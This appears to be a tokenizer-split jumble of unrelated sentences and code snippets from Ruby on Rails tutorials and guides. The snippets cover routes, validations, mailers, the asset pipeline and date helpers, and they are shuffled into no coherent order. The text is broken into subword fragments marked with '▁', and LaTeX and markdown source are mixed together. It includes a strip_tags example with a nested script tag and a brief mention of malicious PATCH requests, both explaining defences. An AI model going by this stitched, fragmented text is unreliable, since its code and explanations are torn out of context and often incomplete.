▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( Figure ~\ ref { fig : demo _ edit _ user _ rails _3} ) .
▁ Don ' t ▁get ▁di s c our age d : ▁the ▁whole ▁point ▁of ▁con t ri but ing ▁to ▁an ▁active ▁open ▁source ▁project ▁is ▁to ▁t a p ▁into ▁the ▁ knowledg e ▁of ▁the ▁ community ▖
▁For ▁example , ▁the ▁\ text tt { POST } ▁request ▁sent ▁when ▁you ▁submit ▁a ▁ registration ▁form ▁creates ▁a ▁new ▁user ▁on ▁the ▁remote ▁site .
▁We ' ll ▁see ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁( and ▁more ▁fully ▁in ▁Chapter ~\ ref { cha : user _ microposts }) ▁how ▁this ▁\ k ode { user \_ id } ▁attribute ▁allows ▁us ▁to ▁succinct ly ▁express ▁the ▁not ion ▁that ▁a ▁user ▁ potentially ▁has ▁many ▁ associated ▁microposts .
▁< td > Ruby ▁on ▁Rails ▁R o c k s !
▁$ ▁ rack up ▁-- help
▁### ▁ Asset ▁Or g an i z ation
▁It ▁work ed !
▁A lthough ▁you ▁can ▁learn ▁a ▁lot ▁by ▁ st u d y ing ▁Table ~\ ref { table : valid _ email _ regex }, ▁to ▁really ▁understand ▁regular ▁expression s ▁I ▁consider ▁using ▁an ▁inter active ▁regular ▁expression ▁match er ▁like ▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } ▁to ▁be ▁essential ▁( Figure ~\ ref { fig : rubular })
▁The ▁purpose ▁of ▁the ▁\ k ode { before \_ create } ▁callback ▁is ▁to ▁assign ▁the ▁token ▁and ▁corresponding ▁digest , ▁which ▁we ▁can ▁accomplish ▁as ▁follows :
▁* ▁` save ( validate : ▁false ) `
▁d ▁= ▁Date ▖ new (200 0, ▁2, ▁29 ) ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁( Listing ~\ ref { code : generated _ application _ mailer } ▁also ▁uses ▁a ▁mailer ▁layout ▁corresponding ▁to ▁the ▁email ▁format ; ▁a lthough ▁it ▁won ' t ▁ever ▁matter ▁in ▁this ▁tutorial , ▁the ▁result ing ▁HTML ▁and ▁plain - text ▁mailer ▁ layouts ▁can ▁be ▁found ▁in ▁\ k ode { app / views / layouts } ▖)
▁The ▁` collection ▖ build ` ▁method ▁returns ▁one ▁or ▁more ▁new ▁objects ▁of ▁the ▁ associated ▁type ▖
▁We ' ll ▁use ▁an ▁HTML ▁\ emph { form } ▁to ▁submit ▁user ▁signup ▁information ▁to ▁our ▁application ▁( Section ~\ ref { sec : signup _ form }), ▁which ▁will ▁then ▁be ▁used ▁to ▁create ▁a ▁new ▁user ▁and ▁save ▁its ▁attributes ▁to ▁the ▁database ▁( Section ~\ ref { sec : successful _ signup s }) .
▁Generat ing ▁a ▁new ▁sample ▁app .
▁A ▁good ▁example ▁of ▁this ▁is ▁the ▁` jquery - rails ` ▁gem ▁which ▁comes ▁with ▁Rails ▁as ▁the ╼ standard ▁JavaScript ▁library ▁gem ▖
▁At ▁this ▁point , ▁running ▁\ k ode { rake ▁test } ▁should ▁get ▁us ▁back ▁to ▁\ passing :
▁< table >
▁to ▁count ▁the ▁microposts .
▁I ▁recommend ▁you ▁e mb ra ce ▁these ▁in evi table ▁ st um b l ing ▁blocks ▁as ▁opportunit ies ▁to ▁work ▁on ▁i mprov ing ▁your ▁technical ▁ sophistication .
▁This ▁example ▁uses ▁the ▁`: message ` ▁option ▁to ▁show ▁how ▁you ▁can ▁include ▁the ╼ attribute ' s ▁value .
▁You ▁can ▁specify ▁conditions ▁on ▁the ▁join ed ▁table s ▁using ▁the ▁regular ▁[ Array ](# array - condition s ) ▁and ▁[ String ](# p ure - string - condition s ) ▁conditions ▖
▁E age r ▁loading ▁is ▁the ▁ mechanism ▁for ▁loading ▁the ▁ associated ▁records ▁of ▁the ▁objects ▁returned ▁by ▁` Model ▖ find ` ▁using ▁as ▁few ▁queries ▁as ▁possible .
▁On ▁the ▁cloud ▁IDE , ▁most ▁un w an ted ▁lines ▁contain ▁the ▁string ▁\ k ode { rvm } ▁( ref er r ing ▁to ▁the ▁Ruby ▁ Version ▁Manager ), ▁so ▁I ▁recommend ▁using ▁the ▁ silencer ▁show n ▁in ▁Listing ~\ ref { code : backtrace _ silencer } ▁to ▁filter ▁them ▁out .
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁ reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { assert \_ equal } ▁method ▁for ▁testing ▁equal ity .
▁It ▁is ▁getting ▁long ▁and ▁a w k ward ▖
▁Let ' s ▁quickly ▁go ▁through ▁and ▁understand ▁what ▁each ╼ part ▁of ▁it ▁does .
▁Also , ▁C HA N G E LO G s ▁should ▁ never ▁be ▁edit ed ▁in ▁ doc rails .
▁You ▁need ▁not ▁supply ▁the ▁extensions ▁explicitly ▖╼
▁( Don ' t ▁worry ▁about ▁what ▁the ▁\ text tt { - u } ▁flag ▁does ; ▁if ▁you ' re ▁curious , ▁do ▁a ▁web ▁search ▁for ▁`` git ▁set ▁ upstream '' ▖)
▁You ▁can ▁also ▁reuse ▁dynamic ▁segment s ▁from ▁the ▁match ▁in ▁the ▁path ▁to ▁redirect ▁to :
▁if ▁record ▖ first _ name ▁== ▁" E v i l "
▁The ▁rest ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁build s ▁on ▁this ▁foundation ▁to ▁make ▁a ▁site ▁with ▁Twitter - like ▁microposts ▁( Chapter ~\ ref { cha : user _ microposts }) ▁and ▁a ▁status ▁feed ▁of ▁posts ▁from ▁followed ▁users ▁( Chapter ~\ ref { cha : following _ users }) .
▁This ▁guide ▁provides ▁you ▁with ▁all ▁you ▁need ▁to ▁get ▁started ▁in ▁sending ▁and ╼ re ce i v ing ▁email s ▁from ▁and ▁to ▁your ▁application , ▁and ▁many ▁ internal s ▁of ▁Action ╼ Mailer ▖
▁ trashable ▁= ▁ trashable _ class ▖ constantize ▖ find ( trashable _ id )
▁The ▁result ▁should ▁be ▁a ▁\ passing \ ▁test ▁suite :
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁te le phone ▁number :
▁#### ▁The ▁` assert _ generate s ` ▁ Assertion
▁You ▁can ▁un comment ▁them ▁to ▁see ▁if ▁they ▁work ▁on ▁your ▁system ▖)
▁< script ▁src ="/ assets / t i cket s ▖ js ?
▁Now ▁we ' re ▁finally ▁ready ▁to ▁see ▁the ▁f ru it s ▁of ▁our ▁ lab or s , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : layout _ no _ logo _ or _ custom _ css } .
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁ registration ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ) .
▁A ▁mockup ▁of ▁successful ▁signup ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ success _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁In ▁the ▁case ▁of ▁an ▁Ajax ▁request , ▁Rails ▁automatically ▁calls ▁a ▁\ emph { JavaScript ▁ Embedded ▁Ruby } ▁(\ k ode { ▖ js ▖ erb }) ▁file ▁with ▁the ▁same ▁name ▁as ▁the ▁action , ▁i ▖ e ▖ , ▁\ k ode { create ▖ js ▖ erb } ▁or ▁\ k ode { destroy ▖ js ▖ erb } .
▁If ▁ dependencies ▁were ▁to ▁be ▁specified ▁inside ▁the ▁` Gemfile `, ▁these ▁would ▁not ╼ be ▁recognize d ▁by ▁a ▁ tr ad it ion al ▁gem ▁install ▁and ▁so ▁they ▁would ▁not ▁be ▁installed ,╼ c a using ▁the ▁engine ▁to ▁m al function .
▁With ▁the ▁asset ╼ pipeline , ▁the ▁preferred ▁location ▁for ▁these ▁assets ▁is ▁now ▁the ▁` app / assets `╼ directory ▖
▁These ▁methods ▁are ▁analogous ▁to ▁their ▁built - in ▁ counter part s ▖
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : remember _ me }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks ▖)
▁Code ▁to ▁test ▁the ▁contents ▁of ▁the ▁Home ▁page .
▁Re g ar d less ▁of ▁the ▁implementation ▁details , ▁I ▁prefer ▁to ▁think ▁of ▁the ▁controller ▁as ▁a ▁c ent r al ▁h ub ▁through ▁which ▁all ▁the ▁application ' s ▁information ▁ flow s .
▁ strip _ tags (" some << b > script > alert (' hello ') << / b > / script > ")
▁There ▁are ▁a ▁few ▁configuration ▁options ▁available ▁in ▁Active ▁Support :
▁invoke ▁ coffee
▁@ order ▁= ▁ Order ▖ create ( order _ date : ▁Time ▖ now , ▁customer _ id : ▁@ customer ▖ id )
▁This ▁ description ▁is ▁just ▁a ▁string , ▁and ▁it ▁can ▁be ▁anything ▁you ▁want ; ▁RSpec ▁doesn ' t ▁care , ▁but ▁you ▁and ▁other ▁ human ▁readers ▁ probably ▁do .
▁Of t en , ▁there ▁is ▁more ╼ than ▁one ▁route ▁to ▁each ▁controller , ▁and ▁different ▁routes ▁can ▁be ▁served ▁by ╼ different ▁ _ action s _ ▖
▁Return s ▁a ▁string ▁of ▁option ▁tags ▁that ▁have ▁been ▁ compiled ▁by ▁it er ating ▁over ▁the ▁` collection ` ▁and ▁assign ing ▁the ▁result ▁of ▁a ▁call ▁to ▁the ▁` value _ method ` ▁as ▁the ▁option ▁value ▁and ▁the ▁` text _ method ` ▁as ▁the ▁option ▁text .
▁When ▁ installing ▁gems , ▁by ▁default ▁ RubyGems ▁generates ▁two ▁different ▁kind s ▁of ▁documentation ▁( called ▁ ri ▁and ▁ rdoc ), ▁but ▁many ▁Ruby ▁and ▁Rails ▁developers ▁find ▁that ▁the ▁time ▁to ▁build ▁them ▁isn ' t ▁worth ▁the ▁benefit .
▁" hello "▖ to (0) ▁# ▁=> ▁" h "
▁Fin ally , ▁the ▁sample ▁app ▁will ▁use ▁all ▁aspect s ▁of ▁ MVC ; ▁we ' ll ▁cover ▁controllers ▁and ▁views ▁starting ▁in ▁Section ~\ ref { sec : static _ pages }, ▁models ▁starting ▁in ▁Section ~\ ref { sec : user _ model }, ▁and ▁we ' ll ▁see ▁all ▁three ▁working ▁together ▁in ▁Section ~\ ref { sec : a _ users _ resource } .
▁╼╼ ▁\ subsection { Heroku ▁deployment , ▁step ▁two } ╼ ▁\ label { sec : heroku _ step _ two }╼╼ The re ▁is ▁no ▁step ▁two !
▁We ' ll ▁complete ▁this ▁task , ▁and ▁with ▁it ▁the ▁sample ▁application , ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁This ▁is ▁easy ▁using ▁the ▁login ▁helper ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁with ▁the ▁two ▁cases ▁appear ing ▁as
▁| ▁--------- ▁| ▁------------ -------- ---------------- ▁| ▁- ---------------- ▁| ▁------------ --------------- --------------- ---------------- ---------------- ▁|
▁Return s ▁a ▁JavaScript ▁tag ▁wrap p ing ▁the ▁provided ▁code .
▁ Pro v id ing ▁engine ▁functionality
▁To ▁redirect ▁users ▁try ing ▁to ▁edit ▁another ▁user ' s ▁profile , ▁we ' ll ▁add ▁a ▁second ▁method ▁called ▁\ k ode { correct \_ user }, ▁together ▁with ▁a ▁before ▁filter ▁to ▁call ▁it ▁( Listing ~\ ref { code : correct _ user _ before _ filter }) .
▁### ▁Record T a g Helper
▁The ▁user ▁edit ▁view .
▁=> ▁" 1 fd a 44 6 9 b c be c 3 bad f 5 4 18 2 6 9 f f c 59 6 8 "
▁A long ▁the ▁way , ▁we ' ll ▁learn ▁how ▁to ▁ seed ▁the ▁database ▁with ▁sample ▁users ▁and ▁how ▁to ▁\ emph { paginate } ▁the ▁user ▁output ▁so ▁that ▁the ▁index ▁page ▁can ▁ scale ▁up ▁to ▁display ▁a ▁ potentially ▁large ▁number ▁of ▁users .
▁In st ance ▁methods ▁are ▁created ▁as ▁well ▁for ▁convenience , ▁they ▁are ▁just ▁pro x ies ▁to ▁the ▁class ▁attribute ▖
▁* ▁` edit ▖ html ▖ erb `
▁# ▁Create s ▁a ▁time ▁select ▁tag ▁that , ▁when ▁POST ed , ▁will ▁be ▁store d ▁in ▁the ▁order ▁variable ▁in ▁the ▁submitted ▁attribute
▁This ▁method ▁will ▁query ▁the ▁database ▁using ▁the ▁same ▁query ▁as ▁` find `, ▁but ▁instead ▁of ▁return ing ▁an ╼ object ▁or ▁collection ▁of ▁objects ▁it ▁will ▁return ▁either ▁` true ` ▁or ▁` false ` .
▁The ▁ macro s ▁` c attr _ reader `, ▁` c attr _ writer `, ▁and ▁` c attr _ accessor ` ▁are ▁analogous ▁to ▁their ▁` attr _ * ` ▁ counter part s ▁but ▁for ▁classes ▖
▁options _ for _ select ( [ ▁" V IS A ", ▁" M as ter C ar d " ▁ ])
▁around _ perform ▁do ▁| job , ▁block |
▁In ▁practice , ▁this ▁will ▁allow ▁you ▁to ▁ precompile ▁local ly , ▁have ▁those ▁files ▁in ▁your ╼ working ▁ tree , ▁and ▁commit ▁those ▁files ▁to ▁source ▁control ▁when ▁needed ▖
▁use ▁Rack :: Conditional G e t
▁Route ▁and ▁URL ▁m app ing ▁for ▁site ▁links .
▁This ▁means ▁that ▁elements ▁inside ▁any ▁tag ▁( such ▁as ▁a ▁\ k ode { div }) ▁with ▁class ▁\ k ode { center } ▁will ▁be ▁ center ed ▁on ▁the ▁page .
▁CSS ▁for ▁the ▁user ▁index .
▁This ▁code ▁automatically ▁ populate s ▁\ k ode { user ▖ followed \_ users } ▁with ▁an ▁array ▁of ▁followed ▁users .
▁All ▁Rails ▁documentation ▁should ▁consistent ly ▁refer ▁to ▁Rails ▁ components ▁by ▁their ▁proper ▁name , ▁and ▁if ▁in ▁your ▁next ▁blog ▁post ▁or ▁present ation ▁you ▁remember ▁this ▁t id bit ▁and ▁take ▁it ▁into ▁account ▁that ' d ▁be ▁ ph en o m en al .
▁The ▁corresponding ▁user ▁edit ▁view ▁( which ▁you ▁will ▁have ▁to ▁create ▁by ▁hand ) ▁is ▁show n ▁in ▁Listing ~\ ref { code : user _ edit _ view } .
▁Generat ing ▁a ▁Static ▁Pages ▁controller .
▁def ▁# { severity ▖ downcase } ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁& block ) ▁# ▁def ▁debug ( message ▁= ▁nil , ▁ prog name ▁= ▁nil , ▁& block )
▁It ▁is ▁possible , ▁of ▁course , ▁to ▁arrange ▁for ▁this ▁information ▁to ▁be ▁handle d ▁secure ly ▁( by ▁ having ▁Git ▁ignore ▁it , ▁for ▁example ), ▁but ▁this ▁is ▁error - prone ▁and ▁requires ▁significant ▁ expert is e .
▁The ▁client ▁code , ▁un aware ▁of ▁the ▁ po t en tial ▁ conflict , ▁ subclasses ▁and ▁defines ▁its ▁own ▁`: log _ level ` ▖
▁* ▁` new _ geocoder _ path ` ▁returns ▁` / geocoder / new `
▁After ▁the ▁cookie ▁is ▁set , ▁on ▁subsequent ▁page ▁views ▁we ▁can ▁retrieve ▁the ▁user ▁with ▁code ▁like
▁As ▁with ▁the ▁other ▁routes , ▁\ k ode { get ▁' signup ' } ▁automatically ▁gives ▁us ▁the ▁named ▁route ▁\ k ode { signup \_ path }, ▁which ▁we ▁put ▁to ▁use ▁in ▁Listing ~\ ref { code : home _ page _ signup _ link } .
▁def ▁new
▁page ▁to ▁make ▁a ▁new ▁user ▁( signup )
▁class ▁Client ▁< ▁ActiveRecord :: Base
▁</ form >
▁has _ many ▁: orders , ▁ dependent : ▁: delete _ all , ▁validate : ▁: false
▁create ▁a ▁new ▁session
▁The ▁Microposts ▁controller ▁in ▁schematic ▁form .
▁The ▁final ▁element ▁is ▁\ k ode { module ▁Application Helper } : ▁module s ▁give ▁us ▁a ▁way ▁to ▁package ▁together ▁related ▁methods , ▁which ▁can ▁then ▁be ▁\ emph { m i x ed ▁in } ▁to ▁Ruby ▁classes ▁using ▁\ k ode { include } .
▁See ▁if ▁you ▁can ▁guess ▁what ▁it ▁will ▁be ▖)
▁d ▖ prev _ year ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁ 19 99
▁The ▁call ▁` str ▖ first ( n ) ` ▁is ▁equivalent ▁to ▁` str ▖ to ( n - 1 ) ` ▁if ▁` n ` ▁> ▁ 0, ▁and ▁returns ▁an ▁empty ▁string ▁for ▁` n ` ▁== ▁0 .
▁ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▁ }
▁but ▁as ▁usual ▁Rails ▁allows ▁us ▁to ▁link ▁directly ▁to ▁the ▁user ▁by ▁automatically ▁convert ing ▁\ k ode { current \_ user } ▁into ▁\ k ode { user \_ path ( current \_ user )} ▁in ▁this ▁context .
▁has _ and _ belongs _ to _ many ▁: f ri end s ,
▁( In clu d ing ▁\ k ode { new } ▁actually ▁generates ▁\ emph { views } ▁as ▁well , ▁which ▁is ▁why ▁we ▁don ' t ▁include ▁actions ▁like ▁\ k ode { create } ▁and ▁\ k ode { delete } ▁that ▁don ' t ▁correspond ▁to ▁views ▖)
▁Create s ▁a ▁standard ▁text ▁field ; ▁use ▁these ▁text ▁fields ▁to ▁input ▁small er ▁ ch un k s ▁of ▁text ▁like ▁a ▁user name ▁or ▁a ▁search ▁query .
▁* ▁Initialize rs
▁Here ▁the ▁\ k ode { show } ▁action ▁is ▁\ emph { implicit } ▁in ▁the ▁type ▁of ▁request --- when ▁Rails ' ▁REST ▁features ▁are ▁ activated , ▁\ text tt { GET } ▁requests ▁are ▁automatically ▁handle d ▁by ▁the ▁\ k ode { show } ▁action .
▁In ▁principle , ▁there ' s ▁ still ▁a ▁minor ▁security ▁hole , ▁which ▁is ▁that ▁an ▁admin ▁could ▁delete ▁h im self ▁by ▁is s u ing ▁a ▁\ text tt { DELETE } ▁request ▁directly .
▁( T h at ▁refinement ▁is ▁ preventing ▁ unactivated ▁users ▁from ▁being ▁displayed , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ activation _ test _ and _ refactoring })▖)
▁Instead , ▁you ▁will ▁get ▁an ▁array ▁of ▁hashes ▁where ▁each ▁hash ▁indicates ▁a ▁record .
▁| ▁| ▁42 9 ▁| ▁: to o _ many _ request s ▁|
▁All ▁that ' s ▁left ▁is ▁writing ▁a ▁short ▁Microposts ▁controller ▁test ▁to ▁check ▁ authorization ▁and ▁a ▁micropost ▁integration ▁test ▁to ▁t i e ▁it ▁all ▁together .
▁* = ▁require ▁reset
▁and ▁Rails ▁\ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { automagically } ▁uses ▁Ajax
▁config ▖ assets ▖ digest ▁= ▁true
▁create ▁app / views / users / new ▖ html ▖ erb
▁Next , ▁we ▁need ▁to ▁update ▁our ▁` Blorgh :: Article Controller # article _ params ` ▁method ▁to ╼ permit ▁the ▁new ▁form ▁parameter :
▁ Array ( foo : ▁: bar ) ▁# ▁=> ▁[ [: foo , ▁: bar ]]
▁ ╼ ▁> > ▁10 ▖ weeks ▖ ago
▁create ▁test / controllers / users _ controller _ test ▖ rb
▁Active ▁Record ▁provides ▁a ▁rich ▁API ▁for ▁access ing ▁data ▁within ▁a ▁database ▖
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }) ▁it ' s ▁important ▁to ▁test ▁it .
▁Date ▖ new (201 2, ▁2, ▁29 )▖ years _ since (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁20 15
▁and ▁that ▁symbol ▁specifie rs ▁are ▁also ▁supported :
▁This ▁will ▁cause ▁the ▁remote ▁clients ▁to ╼ request ▁a ▁new ▁copy ▁of ▁the ▁content ▖
▁This ▁guide ▁cover s ▁the ▁asset ▁pipeline .
▁For ▁example , ▁you ▁may ▁want ▁to ▁store ▁all ▁ employee s ▁in ▁a ▁single ▁database ▁model , ▁but ▁be ▁able ▁to ▁t ra ce ▁relationships ▁such ▁as ▁between ▁ manager ▁and ▁sub or d in ate s ▖
▁If ▁you ▁attempt ▁to ▁access ▁a ▁field ▁that ▁is ▁not ▁in ▁the ▁initializ ed ▁record ▁you ' ll ▁receive :
▁As ▁seen ▁in ▁Figure ~\ ref { fig : filled _ in _ form }, ▁text ▁and ▁email ▁fields ▁(\ k ode { type =" text "} ▁and ▁\ k ode { type =" email " }) ▁simply ▁display ▁their ▁contents , ▁whereas ▁password ▁fields ▁(\ k ode { type =" password " }) ▁ ob s c ure ▁the ▁input ▁for ▁security ▁purposes , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : filled _ in _ form } .
▁You ▁can ▁then ▁style ▁this ▁ div ▁however ▁you ' d ▁like ▖
▁In ▁this ▁section , ▁we ' ll ▁implement ▁an ▁account ▁activation ▁step ▁to ▁verify ▁that ▁the ▁user ▁control s ▁the ▁email ▁address ▁they ▁used ▁to ▁sign ▁up .
▁The ▁code ▁to ▁create ▁the ▁m app ing ▁of ▁user ▁URLs ▁to ▁controller ▁actions ▁for ▁the ▁Users ▁resource ▁appears ▁in ▁Listing ~\ ref { code : rails _ routes } ; ▁this ▁code ▁effective ly ▁set s ▁up ▁the ▁table ▁of ▁URL / action ▁pair s ▁seen ▁in ▁Table ~\ ref { table : user _ url s } .
▁Ou r ▁plan ▁is ▁to ▁define ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁function ▁to ▁return ▁a ▁Gravatar ▁image ▁for ▁a ▁given ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ view _ with _ gravatar } .
▁Because ▁the ▁\ k ode { remember } ▁method ▁doesn ' t ▁set ▁\ k ode { session [: user \_ id ]} , ▁this ▁ procedure ▁will ▁test ▁the ▁desired ▁`` remember '' ▁branch .
▁If ▁all ╼ tests ▁are ▁passing , ▁that ' s ▁enough ▁to ▁pro po se ▁your ▁con t ri but ion ▖
▁We ' ll ▁start ▁with ▁the ▁ internal ▁structure ▁of ▁the ▁document .
▁assemblies ▖ delete ( object , ▁ ▖▖▖)
▁As ▁noted ▁in ▁the ▁\ href { http :// en ▖ gravatar ▖ com / site / implement / hash /}{ Gravatar ▁documentation }, ▁Gravatar ▁URLs ▁are ▁base d ▁on ▁an ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M D 5 } { M D 5 ▁hash } ▁of ▁the ▁user ' s ▁email ▁address .
▁=> ▁[" E mail ▁is ▁invalid ", ▁" Password ▁is ▁too ▁short ▁( minimum ▁is ▁6 ▁characters ) "]
▁Rails ▁4 ▁ ship s ▁with ▁the ▁[ Turbolinks ▁gem ]( https :// github ▖ com / rails / turbolinks )▖ ╼
▁The ▁final ▁implementation ▁of ▁the ▁feed ▖
▁To ▁accomplish ▁this , ▁we ▁use ▁the ▁\ k ode { let !} ▁variant :
▁Guard ▁automatically ▁start s ▁a ▁Spork ▁server , ▁d ra ma tic ally ▁red u c ing ▁the ▁over head ▁each ▁time ▁a ▁test ▁get s ▁run .
▁The ▁sample ▁application ▁in ▁production .
▁Re port ing ▁an ▁ Issue
▁date _ field _ tag ▁" d ob "
▁A ▁test ▁for ▁an ▁ unsuccessful ▁edit ▖
▁This ▁is ▁also ▁the ▁only ▁Rails ▁book ▁that ▁does ▁test - driven ▁development ▁the ▁entire ▁time , ▁an ▁approach ▁high ly ▁recommended ▁by ▁the ▁ expert s ▁but ▁which ▁has ▁ never ▁been ▁so ▁clear ly ▁demonstrate d ▁before .
▁We ▁saw ▁a ▁similar ▁idea ▁in ▁Section ~\ ref { sec : uniqueness _ validation }, ▁where ▁we ▁needed ▁to ▁convert ▁an ▁email ▁address ▁to ▁lower - case ▁before ▁saving ▁a ▁user ▁to ▁the ▁database .
▁For ▁content ▁that ▁is ▁static ▁or ▁in f r equ ent ly ▁changed , ▁this ▁provides ▁an ╼ ea sy ▁way ▁to ▁tell ▁whether ▁two ▁versions ▁of ▁a ▁file ▁are ▁identical , ▁even ▁a cross ╼ different ▁server s ▁or ▁deployment ▁date s .
▁This ▁provides ▁ additional ▁flexibility ▁and ▁make s ▁it ▁explicit ▁that ▁you ' re ▁only ▁ generating ▁HTTP ▁headers .
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing \ ▁after ▁changing ▁the ▁application ▁code :
▁To ▁set ▁this ▁configuration ▁setting ▁within ▁the ▁application , ▁an ▁initializer ▁should ╼ be ▁used ▖
▁For ▁ NGINX :
▁# ▁ SELECT ▁count (* ) ▁AS ▁count _ all ▁FROM ▁clients
▁</ div >
▁# ▁' include d ▁do ' ▁cause s ▁the ▁included ▁code ▁to ▁be ▁evaluated ▁in ▁the
▁has _ many ▁: patients , ▁through : ▁: appointment s
▁* ▁[ O f ficial ▁Rack ▁Web site ]( http :// rack ▖ github ▖ io )
▁end ▁# ▁end
▁This ▁ underscore s ▁the ▁ danger ▁of ▁ ex po s ing ▁our ▁objects ▁to ▁the ▁ w i ld ▁Web : ▁if ▁we ▁simply ▁passed ▁an ▁initialization ▁hash ▁in ▁from ▁an ▁arbitrar y ▁web ▁request , ▁a ▁ malicious ▁user ▁could ▁send ▁a ▁\ text tt { PATCH } ▁request ▁as ▁follows
▁As ▁a ▁work ar ound , ▁specify ▁the ▁URL ▁for ▁the ▁form ▁directly , ▁like ▁so :
▁` camelize ` ▁accept s ▁an ▁optional ▁argument , ▁it ▁can ▁be ▁`: up p er ` ▁( default ), ▁or ▁`: low er ` ▖
▁concern s ▁: comment able
▁in ▁Listing ~\ ref { code : micropost _ order _ test } ▁and
▁We ' ll ▁add ▁a ▁` data - * `╼ attribute ▁to ▁our ▁link , ▁and ▁then ▁ bind ▁a ▁handle r ▁to ▁the ▁click ▁even t ▁of ▁every ▁link ╼ that ▁has ▁that ▁attribute :
▁Validat ing ▁the ▁presence ▁of ▁an ▁\ k ode { email } ▁attribute ▖
▁At ▁this ▁point , ▁if ▁you ▁are ▁using ▁Git ▁you ▁should ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁You ' d ▁need ▁to ▁remove ▁that ╼ line ▁from ▁your ▁Gemfile ▁when ▁upgrading ▖
▁For ▁example , ▁say ▁you ▁want ▁to ▁send ▁a ▁new s let ter ▁who se ▁language ▁depend s ▁on ▁the ▁user ▖
▁Return s ▁a ▁text area ▁open ing ▁and ▁ closing ▁tag ▁set ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁Having ▁defined ▁an ▁action ▁that ▁returns ▁the ▁desired ▁string , ▁we ▁need ▁to ▁tell ▁Rails ▁to ▁use ▁that ▁action ▁instead ▁of ▁the ▁default ▁page ▁in ▁Figure ~\ ref { fig : riding _ rails _ environment } .
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 000 000 02 9 a 08 38 >
▁The ▁code ▁in ▁the ▁User ▁model ▁parallel s ▁the ▁\ k ode { create \_ activation \_ digest } ▁method ▁used ▁in ▁the ▁\ k ode { before \_ create } ▁callback ▁( Listing ~\ ref { code : user _ model _ activation _ code }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset } .
▁A ▁mockup ▁of ▁the ▁login ▁form .
▁* ▁` photos _ path ` ▁returns ▁` / photos `
▁# ▁app / mailers / application _ mailer ▖ rb
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) .
▁If ▁you ' d ▁like ▁to ▁refactor ▁other ▁tests ▁to ▁use ▁\ k ode { full \_ title } ▁( such ▁as ▁those ▁in ▁Listing ~\ ref { code : base _ title _ test }), ▁you ▁should ▁include ▁the ▁Application ▁ Helper ▁in ▁\ k ode { test \_ helper ▖ rb } ▁instead .
▁The ▁test ▁appears ▁in ▁Listing ~\ ref { code : microposts _ interface _ test } .
▁When ▁you ▁declare ▁a ▁` has _ one ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁f ive ▁methods ▁related ▁to ▁the ▁association :
▁Signup ▁failure ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4 - full ▖ png }{( full ▁size )}
▁Active ▁Record ▁offer s ▁many ▁pre - defined ▁validation ▁helpers ▁that ▁you ▁can ▁use ╼ d ir ec t ly ▁inside ▁your ▁class ▁definition s ▖
▁If ▁there ' s ▁a ▁new ╼ feature ▁that ▁you ▁want ▁to ▁see ▁added ▁to ▁Ruby ▁on ▁Rails , ▁you ' ll ▁need ▁to ▁write ▁the ╼ code ▁yourself ▁- ▁or ▁con v ince ▁some one ▁else ▁to ▁part n er ▁with ▁you ▁to ▁write ▁the ▁code ▖╼
▁root ▁' pages # main ' ▁# ▁shortcut ▁for ▁the ▁above
▁Rails ▁follows ▁a ▁simple ▁set ▁of ▁ coding ▁style ▁convention s :
▁class ▁R o le ▁< ▁ActiveRecord :: Base
▁Association ▁callbacks ▁are ▁similar ▁to ▁normal ▁callbacks , ▁but ▁they ▁are ▁trigger ed ▁by ▁events ▁in ▁the ▁ life ▁c y c le ▁of ▁a ▁collection ▖
